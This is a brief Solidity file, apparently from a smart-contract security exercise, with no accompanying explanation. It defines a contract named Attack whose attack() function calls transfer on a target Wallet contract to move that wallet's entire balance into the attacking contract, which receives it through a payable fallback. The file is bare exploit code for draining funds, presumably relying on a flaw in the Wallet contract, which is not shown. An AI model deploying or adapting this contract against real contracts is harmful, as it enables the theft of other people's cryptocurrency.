pragma solidity ^0.8.19;
import "./Wallet.sol";
// SPDX-License-Identifier: UNLICENSED
contract Attack {
    address payable owner;
    Wallet wallet;
    constructor(address w) {
        wallet = Wallet(w);
        owner = payable(address(this));
    }
    function attack() public {
        wallet.transfer(owner, address(wallet).balance);
    }
    fallback() external payable {}
}